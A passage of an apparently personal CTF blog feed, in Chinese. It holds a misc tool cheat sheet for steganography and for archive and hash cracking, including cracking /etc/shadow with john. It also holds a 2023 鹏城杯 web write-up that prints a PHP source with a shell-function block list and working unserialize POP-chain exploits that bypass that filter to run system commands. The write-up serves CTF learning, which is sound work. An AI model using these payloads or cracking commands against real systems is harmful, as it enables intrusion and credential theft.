1.jpg<br></code></pre></td></tr></table></figure><h3 id="montage">montage</h3><p>拼接多个图片变成一个图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">montage *.jpg -tile 8X6 -geometry +0+0 1.jpg   <br></code></pre></td></tr></table></figure><h3 id="outguess">Outguess</h3><p>outguess隐写，jpg，密码可以为空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">outguess -k <span class="hljs-string">&#x27;password&#x27;</span> -r 2.jpg -t 1.txt<br></code></pre></td></tr></table></figure><h3 id="qr_research">QR_Research</h3><p>二维码扫描工具，图形化界面，最高30%纠错率</p><h3 id="qrscan">QrScan</h3><p>批量识别二维码</p><p>https://github.com/zfb132/QrScan</p><h3 id="f5-steganography">F5-steganography</h3><p>F5隐写，jpg、gif、bmp，密码可以为空 git clonehttps://github.com/matthewgao/F5-steganography</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">java Extract xx.jpg -p <span class="hljs-string">&#x27;password&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="jphswin"><strong>Jphswin</strong></h3><p>对有损压缩JPEG文件进行信息的加密隐藏、探测提取的工具，图形化</p><h3 id="zsteg"><strong>zsteg</strong></h3><p>基于Ruby编写的图片隐写分析工具，kali下使用比较方便</p><p><code>gem install zsteg</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#查看所有通道的隐写</span><br><span class="hljs-attribute">zsteg</span> <span class="hljs-number">1</span>.png --<span class="hljs-literal">all</span><br><span class="hljs-comment">#导出某一通道</span><br><span class="hljs-attribute">zsteg</span> -E extradata:<span class="hljs-number">0</span> green.png &gt; flag.zip<br></code></pre></td></tr></table></figure><h3 id="stegdetect">stegdetect</h3><p>检测jpg隐写工具，有时候不太准https://blog.csdn.net/qq_53079406/article/details/124596878</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">.\stegdetect.exe -tjopi -s 10.0 1.jpg<br></code></pre></td></tr></table></figure><h3 id="blindwatermark"><strong>BlindWaterMark</strong></h3><p>盲水印提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png<br></code></pre></td></tr></table></figure><h3 id="deepsound">deepsound</h3><p>图形化音频隐写，将文件隐写进音频中</p><p>https://github.com/oneplus-x/DeepSound-2.0http://jpinsoft.net/deepsound/download.aspx</p><h3 id="silenteye"><strong>silenteye</strong></h3><p>图形化图片/音频隐写工具</p><p>https://achorein.github.io/silenteye/download/?i2</p><h3 id="exiftool">exiftool</h3><p>图片信息查看工具</p><p><code>apt-get install exiftool</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exiftool</span> <span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><p>用法大全：https://www.rmnof.com/article/exiftool-introduction/</p><h3 id="cloacked-pixel">cloacked-pixel</h3><p>有密码的lsb隐写，集成在puzzlesolver</p><p>单独地址：https://github.com/livz/cloacked-pixel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 lsb.py extract 1.png 1.txt 123456<br></code></pre></td></tr></table></figure><h3 id="snow">SNOW</h3><p>snow隐写（the Steganographic Nature Of Whitespace）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP">加密<br>SNOW.EXE -C -m <span class="hljs-string">&quot;message&quot;</span> -p <span class="hljs-string">&quot;passswd&quot;</span> infile outfile<br>解密<br>SNOW.EXE -C -p <span class="hljs-string">&quot;passwd&quot;</span> infile outfile<br></code></pre></td></tr></table></figure><h3 id="audacity">Audacity</h3><p>图形化，音频隐写</p><h3 id="steganography">steganography</h3><p>PixelJihad，png，可无密码</p><h3 id="wbstego4open">wbStego4open</h3><p>图形化PDF、BMP、 TXT、 HTM隐写，要密码</p><h3 id="pngcheck">pngcheck</h3><p>检查png的idat块</p><p><code>apt-get install pngcheck</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pngcheck</span> -v <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><h3 id="identify">Identify</h3><p>linux下检查图片信息，主要用于识别gif的帧间隔时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">identify -format <span class="hljs-string">&quot;%s %T \n&quot;</span> 1.gif<br></code></pre></td></tr></table></figure><h3 id="npiet">npiet</h3><p>用位图色块来编写程序，特征为图片的rgb很乱，多彩色部分，png、jpg、gif，无密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">npiet.exe -tpic <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><h3 id="dtmf2num">dtmf2num</h3><p>音频拨号隐写，wav</p><p>http://aluigi.altervista.org/mytoolz/dtmf2num.zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">dtmf2num.exe 1.wav<br></code></pre></td></tr></table></figure><h3 id="mp3stego">MP3stego</h3><p>音频隐写，mp3、aac</p><p>https://www.petitcolas.net/steganography/mp3stego/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">Decode.exe -X -P 123456 1.WAV<br></code></pre></td></tr></table></figure><h3 id="ntfsstreamseditor">ntfsstreamseditor</h3><p>ntfs流隐写</p><h3 id="qsstv">qsstv</h3><p>linux上的sstv接收软件，特点是可以直接读取wav音频文件里的信息，免去了外放的困扰</p><p><code>apt-get install qsstv</code></p><h2 id="爆破">爆破</h2><h3 id="archpr">ARCHPR</h3><p>rar4/zip等爆破密码</p><h3 id="aopr">AOPR</h3><p>office文档（word、excel、ppt）爆破</p><h3 id="apdfpr">APDFPR</h3><p>pdf爆破</p><h3 id="zip2john">zip2john</h3><p>配合john，zip文件爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，flag.txt为加密文件</span><br>zip2john 1.zip &gt; flag.txt<br><span class="hljs-comment">#此时flag.txt变为hash值</span><br>john flag.txt<br></code></pre></td></tr></table></figure><h3 id="john">john</h3><p>爆破hash，kail下方便使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">john /etc/shadow --format=crypt<br></code></pre></td></tr></table></figure><h3 id="rarcrack">rarcrack</h3><p>爆破zip/rar/7z，本地生成xml文件，可修改字典以及位数，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，20位线程数，type可选zip/rar/7z</span><br>rarcrack 1.zip --threads 20 --<span class="hljs-built_in">type</span> zip<br></code></pre></td></tr></table></figure><h3 id="fcrackzip">fcrackzip</h3><p>爆破zip，可指定位数、模式等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，-l 1-10位数，-c1纯数字，-b暴力破解，-u 使用unzip删除错误</span><br>fcrackzip -v -b -u -l 1-10 -c1 1.zip <br></code></pre></td></tr></table></figure><h3 id="crc32爆破压缩包文件内容">crc32爆破压缩包文件内容</h3><p>小于4字节 CRC32-Tools-1.1</p><p>大于4字节(5-6) crc32.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python crc32.py reverse 0x....<br></code></pre></td></tr></table></figure><h3 id="bkcrack">bkcrack</h3><p>明文爆破，需要已知12字节且其中至少8字节连续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-c 压缩包里加密的文件（或提取的密文数据）<br>-p 提取的明文部分<br>-x 压缩包内目标文件的偏移地址  部分已知明文值<br>-C 加密压缩包<br>-o offset  <br>-p 参数指定的明文在压缩包内目标文件的偏移量<br>-k 解出的密钥<br><br>bkcrack.exe -C encrypted.zip -c cipher -P plain.zip -p plain<br><br>bkcrack.exe -C encrypted.zip -c decipheredfile -k 12345678 23456789 34567890 -d decipheredfile<br></code></pre></td></tr></table></figure><h2 id="其他">其他</h2><h3 id="cyberchef">CyberChef</h3><p>最强的解码工具</p><p>https://icyberchef.com/</p><h3 id="acropalypse-multi-tool">Acropalypse-Multi-Tool</h3><p>windows截图剪贴板漏洞(aCropalypse)https://github.com/frankthetank-music/Acropalypse-Multi-Tool</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">python gui.py<br></code></pre></td></tr></table></figure><h3 id="git_extract">Git_Extract</h3><p>本地.git恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">python2 /home/ddd/桌面/Git_Extract-master/git_extract.py .git    <br></code></pre></td></tr></table></figure><h3 id="sysdig">sysdig</h3><p>sysdig恢复scap为可读日志文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">sysdig -r charon.scap &gt; <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><h3 id="mouse-recorder">Mouse Recorder</h3><p><code>.rsmr</code>文件，鼠标轨迹还原</p><p>https://www.robot-soft.com/</p><h3 id="ffmpeg">ffmpeg</h3><p>分离视频音轨、帧</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffmpeg</span> -i flag.avi ./%<span class="hljs-number">4</span>d.png<br></code></pre></td></tr></table></figure><h3 id="crass">crass</h3><p>xp3提取器</p><p>https://github.com/chaceli/CTF_WP/blob/master/2018starctf/misc/xp3/wp/xp3%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E5%99%A8.7z</p><h3 id="pcapfix">pcapfix</h3><p>pcap文件修复</p><h2 id="参考">参考</h2><p>https://byxs20.github.io/</p><p>https://cloud.tencent.com/developer/article/2069964</p><p>https://www.cnblogs.com/perfsky/p/17739016.html</p>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023鹏城杯</title>
    <link href="/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/"/>
    <url>/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="鹏城杯">2023鹏城杯</h1><h1 id="web">WEB</h1><h2 id="web1">web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hacker-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;<span class="hljs-title function_ invoke__">hacker</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$parms1</span></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$parms1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;hacker-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;welcome~ &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-string">&#x27;welcome&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;method,<span class="hljs-variable">$this</span>-&gt;args);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nonono</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pop&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">nonono</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>非预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;welcome~ &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::welcome  $username</span><br><span class="hljs-comment">// Hacker::__toString</span><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>));<br></code></pre></td></tr></table></figure><p>预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-string">&#x27;system&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::__destruct   $username</span><br><span class="hljs-comment">// A::__toString   $hacker</span><br><span class="hljs-comment">// C::__get        $finish</span><br><span class="hljs-comment">// K::__call       $func</span><br><span class="hljs-comment">// E::__invoke     $hacker</span><br><span class="hljs-comment">// R::welcome</span><br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">K</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">R</span>();<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/system/&quot;</span>, <span class="hljs-string">&quot;syssystemtem&quot;</span>, <span class="hljs-variable">$aaa</span>);<span class="hljs-comment">//用的preg_replace($filter,&#x27;&#x27;,$a);多加一个就行</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span 